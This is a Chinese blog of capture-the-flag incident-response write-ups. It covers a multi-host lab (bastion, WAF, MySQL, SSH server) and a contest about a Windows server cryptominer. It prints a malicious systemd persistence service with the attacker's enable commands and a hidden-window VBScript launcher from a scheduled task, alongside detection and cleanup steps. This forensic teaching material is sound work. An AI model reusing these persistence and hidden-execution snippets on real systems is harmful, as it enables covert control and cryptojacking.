应急响应主线</h2><p><strong>网络架构</strong></p><p><img src="https://pic1.imgdb.cn/item/683fffd658cb8da5c82bf60f.png"></p><h3 id="应急响应2-1（堡垒机中flag）"><a href="#应急响应2-1（堡垒机中flag）" class="headerlink" title="应急响应2-1（堡垒机中flag）"></a>应急响应2-1（堡垒机中flag）</h3><blockquote><p>题目描述：提交堡垒机中留下的flag</p></blockquote><p>1、登录JumpServer，查看更新标签中，存在的flag</p><img src="https://pic1.imgdb.cn/item/6840027858cb8da5c82c05f4.png" style="zoom:50%;"><p>还有一种方式，直接在虚拟机中进行查询，进入/data/jumpserver目录中，使用grep搜索包含flag1字符串的文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r 'flag1' .//-r 递归搜索某个目录以及子目录下的所有文件</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6840052958cb8da5c82c1284.png"></p><p>发现两个文件中都包含flag1</p><h3 id="应急响应2-2（waf中flag）"><a href="#应急响应2-2（waf中flag）" class="headerlink" title="应急响应2-2（waf中flag）"></a>应急响应2-2（waf中flag）</h3><blockquote><p>题目描述：提交WAF中隐藏的flag</p></blockquote><p>1、打开waf机子，登录waf，在身份认证-用户管理-配置 中找到flag</p><img src="https://pic1.imgdb.cn/item/684006e058cb8da5c82c1bca.png" style="zoom: 67%;"><p>同样的，也可以直接在waf机子中，用grep搜索，为了有权限访问文件，需要登陆root用户，root用户没有密码可以设置一个。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root//设置root密码</span><br><span class="line">grep -r 'palu{' .</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/684014b958cb8da5c82c8662.png"></p><h3 id="应急响应2-3（mysql中flag）"><a href="#应急响应2-3（mysql中flag）" class="headerlink" title="应急响应2-3（mysql中flag）"></a>应急响应2-3（mysql中flag）</h3><blockquote><p>题目描述：提交Mysql中留下的flag</p></blockquote><p>1、Navicat远程连接数据库，并查看</p><p><img src="https://pic1.imgdb.cn/item/684015cf58cb8da5c82c86b0.png"></p><p>方法二：因为root的家目录下存在1panel的文件，所以其在1panel运维管理面板，mysql可能是在1panel上进行创建的，所以mysql文件在1panel子目录中，1panel安装在opt文件夹中，所以进入/opt使用grep搜索文件内容，再使用strings命令查看字符串</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r 'palu{' .</span><br></pre></td></tr></tbody></table></figure><img src="https://pic1.imgdb.cn/item/68401a1958cb8da5c82c88bf.png" style="zoom: 67%;"><blockquote><p><code>/opt</code> 文件夹（<strong>Optional Software</strong>）是一个用于安装<strong>第三方应用程序</strong>或<strong>附加软件包</strong>的标准目录。它的设计目的是为了避免将非系统自带的软件安装到 <code>/usr</code> 或 <code>/usr/local</code> 中，从而保持系统文件的整洁性。</p></blockquote><blockquote><p><strong>.ibd 文件</strong> 是 <strong>MySQL 或 MariaDB</strong> 数据库中的一种数据存储文件，全称是 <strong>InnoDB Data File</strong>（InnoDB 数据文件）。它属于 <strong>InnoDB 存储引擎</strong> 的专用文件格式，用于存储 <strong>表数据</strong> 和 <strong>索引</strong>。</p></blockquote><h4 id="strings命令"><a href="#strings命令" class="headerlink" title="strings命令"></a>strings命令</h4><p><code>strings</code> 是一个 Linux/Unix 命令行工具，<strong>用于提取文件中的可打印字符串</strong>。它通常用于分析二进制文件（如可执行程序、库文件、内存转储等），从中提取人类可读的文本信息（如硬编码的路径、密码、调试信息等）。</p><ul><li>常见用途：</li></ul><p>(1) 提取二进制文件中的字符串</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /bin/ls</span><br></pre></td></tr></tbody></table></figure><p>输出 <code>/bin/ls</code> 中所有可打印字符串（如函数名、错误消息等）。</p><p>(2) 查找特定关键词</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings malware.exe | grep -i "password"</span><br></pre></td></tr></tbody></table></figure><p>检查二进制文件中是否包含敏感关键词（如密码、API密钥）。</p><p>(3) 分析内存转储</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings core.dump | grep "error"</span><br></pre></td></tr></tbody></table></figure><p>从崩溃的内存转储文件中提取错误信息。</p><p>(4) 提取PDB路径（调试信息）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings binary.exe | grep "\.pdb"</span><br></pre></td></tr></tbody></table></figure><p>常用于逆向工程，查找编译时的调试文件路径（可能泄露开发者信息）。</p><h3 id="应急响应2-4（攻击者IP）"><a href="#应急响应2-4（攻击者IP）" class="headerlink" title="应急响应2-4（攻击者IP）"></a>应急响应2-4（攻击者IP）</h3><blockquote><p>题目描述：提交攻击者的攻击IP</p></blockquote><p>1、直接查看waf的攻击日志，找到发起大量攻击的ip</p><p><img src="https://pic1.imgdb.cn/item/68429d0858cb8da5c834efa1.png"></p><p><strong>所以 攻击IP为192.168.20.107</strong></p><h3 id="应急响应2-5（最早攻击时间）"><a href="#应急响应2-5（最早攻击时间）" class="headerlink" title="应急响应2-5（最早攻击时间）"></a>应急响应2-5（最早攻击时间）</h3><blockquote><p> 题目描述：提交攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx:xx:xx}</p></blockquote><p>1、查看waf攻击日志，找到这个攻击IP最早的攻击时间</p><p><img src="https://pic1.imgdb.cn/item/68429f5858cb8da5c834f497.png"></p><h3 id="应急响应2-6（web泄露文件名）"><a href="#应急响应2-6（web泄露文件名）" class="headerlink" title="应急响应2-6（web泄露文件名）"></a>应急响应2-6（web泄露文件名）</h3><blockquote><p>题目描述：提交web服务泄露的关键文件名</p></blockquote><p>1、web服务是80端口，找到对应的防护应用，看到key.txt，访问查看</p><img src="https://pic1.imgdb.cn/item/6842a01658cb8da5c834f5d3.png" style="zoom: 50%;"><p>2、确实为泄露的信息</p><img src="https://pic1.imgdb.cn/item/6842a04658cb8da5c834f6b7.png" style="zoom: 67%;"><p><strong>所以 关键文件名为key.txt</strong></p><h3 id="应急响应2-7（泄露的邮箱）"><a href="#应急响应2-7（泄露的邮箱）" class="headerlink" title="应急响应2-7（泄露的邮箱）"></a>应急响应2-7（泄露的邮箱）</h3><blockquote><p>题目描述：提交泄露的邮箱地址作为flag进行提交</p></blockquote><p>1、在key.txt中发现一个泄露的邮箱</p><p><img src="https://pic1.imgdb.cn/item/6842a09458cb8da5c834f709.png"></p><p>所以 该邮箱为<a href="mailto:parloo@parloo.com">parloo@parloo.com</a></p><h3 id="应急响应2-8（攻击者立足点服务器IP）"><a href="#应急响应2-8（攻击者立足点服务器IP）" class="headerlink" title="应急响应2-8（攻击者立足点服务器IP）"></a>应急响应2-8（攻击者立足点服务器IP）</h3><blockquote><p>题目描述：提交立足点服务器ip地址</p></blockquote><p>1、在waf上查看server1的访问日志，发现一个ip大量对网站进行扫描，应该就是攻击者的立足ip</p><p><img src="https://pic1.imgdb.cn/item/6842a19758cb8da5c834ffd5.png"></p><p>“立足点服务器IP”通常是指在网络安全或渗透测试中，攻击者用来作为跳板或中转的服务器IP地址。这类服务器可能是被攻击者控制的设备，用于隐藏真实攻击源或作为进一步攻击的起点。</p><p>具体含义：</p><ol><li><strong>跳板作用</strong>：攻击者通过入侵或利用某些服务器（即“立足点”），将其作为中转站发起后续攻击，避免直接暴露自己的真实IP。</li><li><strong>隐匿行踪</strong>：通过多层跳板（如“代理链”或“Tor网络”），增加追踪难度。</li><li><strong>长期控制</strong>：攻击者可能长期维护这些服务器，作为后续攻击的基地（如APT攻击中的“持久化”）。</li></ol><h3 id="应急响应2-9（提权用户密码）"><a href="#应急响应2-9（提权用户密码）" class="headerlink" title="应急响应2-9（提权用户密码）"></a>应急响应2-9（提权用户密码）</h3><blockquote><p>题目描述：提交攻击者使用的提权用户密码,flag格式为:palu{username/password}</p></blockquote><p>1、打开sshserver的机子，查看/ect/passwd发现有一个parloo用户，拥有/bin/sh所以可以怀疑是攻击者</p><p><img src="https://pic1.imgdb.cn/item/6842a82d58cb8da5c8356f01.png"></p><p>打开server1的机子，打开1Panel的管理面板，其中管理着两个web网站，其中一个写了员工账户密码，猜测parloo密码为parloo</p><p><img src="https://pic1.imgdb.cn/item/6842a46058cb8da5c8352c00.png"></p><h3 id="应急响应2-10（攻击者留下文件）"><a href="#应急响应2-10（攻击者留下文件）" class="headerlink" title="应急响应2-10（攻击者留下文件）"></a>应急响应2-10（攻击者留下文件）</h3><blockquote><p>题目描述：提交攻击者留下的的文件内容作为flag提交</p></blockquote><p>1、在sshserver机子中，/home目录下找到parloo用户家目录，找到flag</p><p><img src="https://pic1.imgdb.cn/item/6842a8da58cb8da5c8357362.png"></p><h3 id="应急响应2-11（权限维持方法服务）"><a href="#应急响应2-11（权限维持方法服务）" class="headerlink" title="应急响应2-11（权限维持方法服务）"></a>应急响应2-11（权限维持方法服务）</h3><blockquote><p>题目描述：提交权限维持方法服务的名称</p></blockquote><p><strong>前置知识</strong></p><blockquote><p><code>/etc/systemd/system/</code> 是 <strong>Linux 系统（使用 systemd 作为初始化系统）</strong> 中的一个关键目录，主要用于存储<strong>用户或管理员<u>自定义</u>的系统服务单元文件（unit files）</strong></p><p><strong>添加自定义服务</strong></p><p>（1）编辑</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/myapp.service</span><br></pre></td></tr></tbody></table></figure><p>内容示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=My Custom App</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/bin/myapp</span><br><span class="line">User=myuser</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></tbody></table></figure><p>（2）<strong>重载配置</strong><br>修改后需让 systemd 重新加载：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl enable --now myapp.service</span><br></pre></td></tr></tbody></table></figure></blockquote><p>1、在/etc/systemd/system目录中发现rootset.service。</p><p><img src="https://pic1.imgdb.cn/item/6842aaee58cb8da5c8358864.png"></p><p>这个 <code>rootset.service</code> 文件是一个典型的 <strong>systemd 后门服务</strong>，攻击者通过它实现 <strong>权限维持（Persistence）</strong>，确保恶意程序在系统重启后仍能自动运行。以下是具体分析：</p><p><u><strong>恶意特征分析</strong></u></p><p>（1）可疑的可执行文件路径</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ConditionFileIsExecutable=/usr/bin/b4b40c44ws</span><br><span class="line">ExecStart=/usr/bin/b4b40c44ws</span><br></pre></td></tr></tbody></table></figure><ul><li>文件名 <code>b4b40c44ws</code> 是随机字符串（无意义命名），明显是为了躲避检测（如 <code>ls /usr/bin</code> 时不易被发现）。</li><li>路径在 <code>/usr/bin/</code> 下，伪装成合法系统程序。</li></ul><p>（2）服务配置的恶意行为</p><ul><li><strong><code>Restart=always</code> + <code>RestartSec=120</code></strong><br>  如果恶意进程崩溃或被杀，systemd 会每 <strong>120 秒自动重启它</strong>，确保后门持续运行。</li><li><strong><code>StartLimitInterval=5</code> + <code>StartLimitBurst=10</code></strong><br>  允许短时间内多次重启（防触发 systemd 的启动限制）。</li></ul><p>（3）持久化安装</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></tbody></table></figure><ul><li>服务被链接到 <code>multi-user.target</code>（标准多用户运行级别），<strong>系统启动时会自动运行</strong>。</li></ul><p>（4）环境变量隐藏</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnvironmentFile=-/etc/sysconfig/rootset</span><br></pre></td></tr></tbody></table></figure><ul><li>从 <code>/etc/sysconfig/rootset</code> 加载环境变量（<code>-</code> 表示忽略文件不存在错误）。</li><li>攻击者可能通过该文件传递隐蔽参数（如 C2 服务器地址）。</li></ul><p><u><strong>攻击者如何利用它？</strong></u></p><ol><li><p><strong>上传恶意程序</strong><br> 将后门木马（如反向 Shell、挖矿程序）放到 <code>/usr/bin/b4b40c44ws</code>。</p></li><li><p><strong>创建服务</strong><br> 通过 <code>rootset.service</code> 确保恶意程序以 root 权限持久化。</p></li><li><p><strong>激活服务</strong></p> <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable --now rootset.service  # 开机自启 + 立即运行</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>维持访问</strong><br> 即使管理员杀死进程，systemd 也会重新启动它。</p></li></ol><p><u><strong>检测与清除方法</strong></u></p><ol><li><strong>检查服务状态</strong></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status rootset.service  # 查看是否正在运行</span><br><span class="line">journalctl -u rootset.service    # 查看日志</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li><strong>删除恶意文件</strong></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop rootset.service</span><br><span class="line">sudo systemctl disable rootset.service</span><br><span class="line">sudo rm /etc/systemd/system/rootset.service</span><br><span class="line">sudo rm /usr/bin/b4b40c44ws      # 删除恶意程序</span><br><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li><strong>排查其他痕迹</strong></li></ol><ul><li><p>检查 <code>/etc/sysconfig/rootset</code>（环境变量文件）。</p></li><li><p>搜索其他可疑服务：</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /etc/systemd/system/ /usr/lib/systemd/system/</span><br><span class="line">grep -r "ExecStart" /etc/systemd/system/</span><br></pre></td></tr></tbody></table></figure></li></ul><ol start="4"><li><strong>安全加固</strong></li></ol><ul><li><p>监控 <code>/usr/bin/</code> 和 <code>/etc/systemd/system/</code> 的文件变化（如使用 <code>auditd</code> 或 <code>tripwire</code>）。</p></li><li><p>限制 systemd 服务创建权限：</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 750 /etc/systemd/system/  # 仅允许 root 写入</span><br></pre></td></tr></tbody></table></figure></li></ul><p><strong>所以 权限维持方法服务名称为rootset.service</strong></p><h3 id="应急响应2-12"><a href="#应急响应2-12" class="headerlink" title="应急响应2-12"></a>应急响应2-12</h3><blockquote><p>题目描述：提交攻击者用于发起攻击的恶意服务器连接地址作为flag提交</p></blockquote><h3 id="应急响应2-13"><a href="#应急响应2-13" class="headerlink" title="应急响应2-13"></a>应急响应2-13</h3><blockquote><p>题目描述：找到系统中被劫持的程序程序名作为flag提交</p></blockquote><h3 id="应急响应2-14"><a href="#应急响应2-14" class="headerlink" title="应急响应2-14"></a>应急响应2-14</h3><blockquote><p>题目描述：找到系统中存在信息泄露的服务运行端口作为flag提交</p></blockquote><h3 id="应急响应2-15"><a href="#应急响应2-15" class="headerlink" title="应急响应2-15"></a>应急响应2-15</h3><blockquote><p>题目描述：提交Parloo公司项目经理的身份证号作为flag提交</p></blockquote><h3 id="应急响应2-16"><a href="#应急响应2-16" class="headerlink" title="应急响应2-16"></a>应急响应2-16</h3><blockquote><p>题目描述：提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{/xxx/xxx}</p></blockquote><h3 id="应急响应2-17"><a href="#应急响应2-17" class="headerlink" title="应急响应2-17"></a>应急响应2-17</h3><blockquote><p>题目描述：提交进源机器中恶意程序的MD5作为flag进行提交。 flag格式为palu{MD5小写}</p></blockquote><h3 id="应急响应2-18"><a href="#应急响应2-18" class="headerlink" title="应急响应2-18"></a>应急响应2-18</h3><blockquote><p>题目描述：提交攻击者留下的恶意账户名称md5后作为flag进行提交。 格式为palu{md5{xxxxx}}</p></blockquote><h3 id="应急响应2-19"><a href="#应急响应2-19" class="headerlink" title="应急响应2-19"></a>应急响应2-19</h3><blockquote><p>题目描述：提交内部群中留下的flag并提交</p></blockquote><h3 id="应急响应2-20"><a href="#应急响应2-20" class="headerlink" title="应急响应2-20"></a>应急响应2-20</h3><blockquote><p>题目描述：请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</p></blockquote><h3 id="应急响应2-21"><a href="#应急响应2-21" class="headerlink" title="应急响应2-21"></a>应急响应2-21</h3><blockquote><p>题目描述：提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}</p></blockquote><h3 id="应急响应2-22"><a href="#应急响应2-22" class="headerlink" title="应急响应2-22"></a>应急响应2-22</h3><blockquote><p>题目描述：提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}</p></blockquote><h3 id="应急响应2-23"><a href="#应急响应2-23" class="headerlink" title="应急响应2-23"></a>应急响应2-23</h3><blockquote><p>题目描述：提交重要数据的明文内容作为flag提交</p></blockquote><h3 id="应急响应2-24"><a href="#应急响应2-24" class="headerlink" title="应急响应2-24"></a>应急响应2-24</h3><blockquote><p>题目描述：提交恶意维权软件的名称作为flag进行提交</p></blockquote><h3 id="应急响应2-25"><a href="#应急响应2-25" class="headerlink" title="应急响应2-25"></a>应急响应2-25</h3><blockquote><p>题目描述：提交恶意程序的外联地址</p></blockquote><h3 id="应急响应2-26"><a href="#应急响应2-26" class="headerlink" title="应急响应2-26"></a>应急响应2-26</h3><blockquote><p>题目描述：提交攻击这使用的恶意dnslog域名作为flag进行提交</p></blockquote><h3 id="应急响应2-27"><a href="#应急响应2-27" class="headerlink" title="应急响应2-27"></a>应急响应2-27</h3><blockquote><p>题目描述：提交寻找反序列化漏洞的端口作为flag进行提交</p></blockquote><h3 id="应急响应2-28"><a href="#应急响应2-28" class="headerlink" title="应急响应2-28"></a>应急响应2-28</h3><blockquote><p>题目描述：提交web服务泄露的密钥作为flag进行提交</p></blockquote><h3 id="应急响应2-29"><a href="#应急响应2-29" class="headerlink" title="应急响应2-29"></a>应急响应2-29</h3><blockquote><p>题目描述：提交攻击者开始攻击的时间作为flag进行提交。flag各式为palu{xxxx/xx/xx:xx:xx:xx}</p></blockquote><h3 id="应急响应2-30"><a href="#应急响应2-30" class="headerlink" title="应急响应2-30"></a>应急响应2-30</h3><blockquote><p>题目描述：提交攻击者在server中留下的账户密码作为flag进行提交。flag格式为palu{username/password}</p></blockquote><h3 id="应急响应2-31"><a href="#应急响应2-31" class="headerlink" title="应急响应2-31"></a>应急响应2-31</h3><blockquote><p>题目描述：提交攻击者维权方法的名称作为flag进行提交</p></blockquote><h3 id="应急响应2-32"><a href="#应急响应2-32" class="headerlink" title="应急响应2-32"></a>应急响应2-32</h3><blockquote><p>题目描述：提交攻击者留下的木马md5后作为flag进行提交</p></blockquote><h3 id="应急响应2-33"><a href="#应急响应2-33" class="headerlink" title="应急响应2-33"></a>应急响应2-33</h3><blockquote><p>题目描述：提交攻击者留下的溯源信息作为flag进行提交</p></blockquote><h3 id="应急响应2-34"><a href="#应急响应2-34" class="headerlink" title="应急响应2-34"></a>应急响应2-34</h3><blockquote><p>题目描述：提交攻击者的githubID作为flag进行提交</p></blockquote><h3 id="应急响应2-35"><a href="#应急响应2-35" class="headerlink" title="应急响应2-35"></a>应急响应2-35</h3><blockquote><p>题目描述：提交攻击者在github下留下的的内容作为flag进行提交</p></blockquote><h3 id="应急响应2-36"><a href="#应急响应2-36" class="headerlink" title="应急响应2-36"></a>应急响应2-36</h3><blockquote><p>题目描述：提交恶意用户的数量作为flag进行提交</p></blockquote><h3 id="应急响应2-37"><a href="#应急响应2-37" class="headerlink" title="应急响应2-37"></a>应急响应2-37</h3><blockquote><p>题目描述：提交恶意用户的默认密码作为flag进行提交</p></blockquote><h3 id="应急响应2-38"><a href="#应急响应2-38" class="headerlink" title="应急响应2-38"></a>应急响应2-38</h3><blockquote><p>题目描述：提交业务数据中攻击者留下的信息作为flag进行提交</p></blockquote><h3 id="应急响应2-39"><a href="#应急响应2-39" class="headerlink" title="应急响应2-39"></a>应急响应2-39</h3><blockquote><p>题目描述：提交私人git仓库中留下的内容作为flag进行提交</p></blockquote><h3 id="应急响应2-40"><a href="#应急响应2-40" class="headerlink" title="应急响应2-40"></a>应急响应2-40</h3><blockquote><p>题目描述：提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</p></blockquote><h3 id="应急响应2-41"><a href="#应急响应2-41" class="headerlink" title="应急响应2-41"></a>应急响应2-41</h3><blockquote><p>题目描述：提交恶意程序中模拟c2通信的函数名称作为flag进行提交</p></blockquote><h3 id="应急响应2-42"><a href="#应急响应2-42" class="headerlink" title="应急响应2-42"></a>应急响应2-42</h3><blockquote><p>题目描述：提交恶意程序创建隐藏文件的名称作为flag提交 </p></blockquote><h3 id="应急响应2-43"><a href="#应急响应2-43" class="headerlink" title="应急响应2-43"></a>应急响应2-43</h3><blockquote><p>题目描述：提交恶意程序中模拟权限提升的函数作为flag进行提交</p></blockquote><h3 id="应急响应2-44"><a href="#应急响应2-44" class="headerlink" title="应急响应2-44"></a>应急响应2-44</h3><blockquote><p>题目描述：提交被钓鱼上线的用户名作为flag进行提交</p></blockquote><h3 id="应急响应2-45"><a href="#应急响应2-45" class="headerlink" title="应急响应2-45"></a>应急响应2-45</h3><blockquote><p>题目描述：提交恶意程序的所在路径作为flag进行提交</p></blockquote><h3 id="应急响应2-46"><a href="#应急响应2-46" class="headerlink" title="应急响应2-46"></a>应急响应2-46</h3><blockquote><p>题目描述：分析恶意程序的反连地址作为flag进行提交</p></blockquote><h3 id="应急响应2-47"><a href="#应急响应2-47" class="headerlink" title="应急响应2-47"></a>应急响应2-47</h3><blockquote><p>题目描述：提交恶意c2的服务器登录的账号密码作为flag进行提交。flag格式为palu{username/password}</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>solar应急响应月赛（5月）</title>
      <link href="/2025/06/01/solar-ying-ji-xiang-ying-yue-sai-5-yue/"/>
      <url>/2025/06/01/solar-ying-ji-xiang-ying-yue-sai-5-yue/</url>
      
        <content type="html"><![CDATA[<h1 id="solar应急响应月赛（5月）"><a href="#solar应急响应月赛（5月）" class="headerlink" title="solar应急响应月赛（5月）"></a>solar应急响应月赛（5月）</h1><h2 id="1-攻击者使用什么漏洞获取了服务器的配置文件？"><a href="#1-攻击者使用什么漏洞获取了服务器的配置文件？" class="headerlink" title="1 攻击者使用什么漏洞获取了服务器的配置文件？"></a>1 攻击者使用什么漏洞获取了服务器的配置文件？</h2><blockquote><p>题目描述：某某文化有限公司的运维小王刚刚搭建服务器发现cpu莫名的异常的升高请你帮助小王排查一下服务器，flag格式为：flag{CVE-2020-12345}</p></blockquote><p>查看Administrator的桌面，存在CrushFTP</p><p><img src="https://pic1.imgdb.cn/item/683c79c258cb8da5c8218d99.png"></p><p>搜CrushFTP近期CVE漏洞</p><p><img src="https://pic1.imgdb.cn/item/683c7b8158cb8da5c8218ed0.png"></p><h2 id="2-系统每天晚上系统都会卡卡的帮小明找到问题出在了那？"><a href="#2-系统每天晚上系统都会卡卡的帮小明找到问题出在了那？" class="headerlink" title="2 系统每天晚上系统都会卡卡的帮小明找到问题出在了那？"></a>2 系统每天晚上系统都会卡卡的帮小明找到问题出在了那？</h2><blockquote><p>题目描述：flag为配置名称（无空格）</p></blockquote><p> <strong>可能的原因分析</strong></p><ol><li><strong>计划任务（Task Scheduler）</strong><ul><li>Windows 默认有一些维护任务（如 <code>Defrag</code> 碎片整理、<code>WindowsUpdate</code> 自动更新）可能在夜间运行。</li><li>检查 <code>taskschd.msc</code>（任务计划程序）中的任务。</li></ul></li><li><strong>Windows Update 自动更新</strong><ul><li><code>WindowsUpdate</code> 可能配置为夜间自动更新，占用大量资源。</li></ul></li><li><strong>磁盘碎片整理（Defrag）</strong><ul><li>默认情况下，Windows 会定期进行磁盘优化（<code>ScheduledDefrag</code>）。</li></ul></li><li><strong>防病毒扫描（Windows Defender 或第三方杀毒软件）</strong><ul><li>可能设置了夜间全盘扫描。</li></ul></li><li><strong>资源占用高的服务</strong><ul><li>如 <code>Superfetch</code>（SysMain）、<code>Windows Search</code> 索引服务可能导致卡顿。</li></ul></li><li><strong>虚拟内存（Pagefile）配置问题</strong><ul><li>如果虚拟内存设置不合理，可能导致系统变卡。</li></ul></li></ol><p>根据以上思路，找到了恶意的计划任务，如下图</p><p><img src="https://pic1.imgdb.cn/item/683c6dcc58cb8da5c82188bd.png"></p><p><strong>sql backing up就是导致每晚卡顿的原因</strong></p><ul><li>知识：</li></ul><p><code>C:\Windows\System32\Tasks</code> 是 <strong>Windows 操作系统存储计划任务（Scheduled Tasks）的默认路径</strong>。</p><p>也可以通过 <strong>任务计划程序（taskschd.msc）</strong> 管理所有任务</p><h2 id="3-恶意域名是什么？"><a href="#3-恶意域名是什么？" class="headerlink" title="3 恶意域名是什么？"></a>3 恶意域名是什么？</h2><blockquote><p>题目描述：flag格式为：flag{xxx.xxxxxxxx.xxx}</p></blockquote><p>查看计划任务调用的内容</p><p><img src="https://pic1.imgdb.cn/item/683c679a58cb8da5c8218494.png"></p><p>这段代码是一个 XML 格式的操作指令，通常用于自动化任务或系统配置中。具体解释如下：</p><ol><li><strong><code>&lt;Actions Context="Author"&gt;</code></strong><br> 表示这是一个”作者上下文”的操作（可能是创建或设计阶段使用的操作）</li><li><strong><code>&lt;Exec&gt;</code></strong><br> 执行命令的指令</li><li><strong><code>&lt;Command&gt;"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwsmprovhost.vbs"&lt;/Command&gt;</code></strong><br> 指定要执行的命令是运行位于 SQL Server 2005(版本90)共享目录下的一个 VBScript 文件</li></ol><p>找到该路径下的sqlwsmprovhost.vbs文件，并查看，如下图</p><p><img src="https://pic1.imgdb.cn/item/683c685258cb8da5c82184e2.png"></p><p>这段 VBScript 代码的功能是创建一个 <strong>WScript.Shell</strong> 对象，并运行一个名为 <strong><code>sqlwscript.cmd</code></strong> 的批处理文件（隐藏窗口运行）。具体解释如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//创建一个 WScript.Shell 对象，用于执行系统命令或运行程序</span><br><span class="line">set ws = createobject("wscript.shell")  </span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//运行 "sqlwscript.cmd" 这个批处理文件，参数 `0` 表示隐藏窗口运行</span><br><span class="line">ws.Run """sqlwscript.cmd""", 0  </span><br></pre></td></tr></tbody></table></figure><ol><li><strong><code>WScript.Shell</code></strong><ul><li>是 Windows 脚本宿主（WSH）提供的对象，用于执行系统命令、操作注册表、运行程序等。</li><li>这里主要用于运行外部程序（<code>.cmd</code> 文件）。</li></ul></li><li><strong><code>ws.Run """sqlwscript.cmd""", 0</code></strong><ul><li><code>Run</code> 方法用于执行指定的程序或命令。</li><li><code>"""sqlwscript.cmd"""</code> 的写法是因为 VBScript 需要用双引号包裹路径，而路径本身可能包含空格，所以用 <code>""</code> 进行转义（相当于 <code>"sqlwscript.cmd"</code>）。</li><li><code>0</code> 表示运行时不显示窗口（隐藏运行）。</li></ul></li></ol><p>然后，打开sqlwscript.cmd查看如下：</p><p><img src="https://pic1.imgdb.cn/item/683c69d158cb8da5c82185d7.png"></p><p>这段批处理脚本 (<code>sqlwscript.cmd</code>) 是一个 <strong>无限循环执行的挖矿脚本</strong>，通常用于 <strong>加密货币挖矿（可能是恶意挖矿程序）</strong>。以下是详细分析：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br></pre></td></tr></tbody></table></figure><ul><li>关闭命令回显，使脚本运行时不会显示执行的命令（隐蔽执行）。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d "%~dp0"</span><br></pre></td></tr></tbody></table></figure><ul><li>切换到脚本所在的目录（<code>%~dp0</code> 表示当前批处理文件的完整路径）。</li><li>确保脚本能正确访问同目录下的文件（如 <code>sqlwpr.exe</code>）。</li></ul><figure class="highlight 